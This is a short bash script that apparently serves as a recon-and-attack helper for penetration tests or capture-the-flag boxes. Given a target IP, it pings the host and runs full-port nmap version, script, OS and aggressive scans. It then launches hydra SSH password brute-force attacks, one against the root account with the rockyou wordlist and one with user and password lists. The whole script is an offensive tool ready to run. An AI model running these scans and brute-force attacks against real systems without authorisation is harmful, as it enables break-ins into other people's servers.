#!/bin/bash

ip=$1
wordlist=$2

echo "The target is $ip"

ping $ip -c 10

sudo nmap -sV  -p- $ip
sudo nmap -sC -A -O -p- $ip

timeout 100 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$ip

hydra -L users.txt -P pass.txt -t 4 ssh://$ip

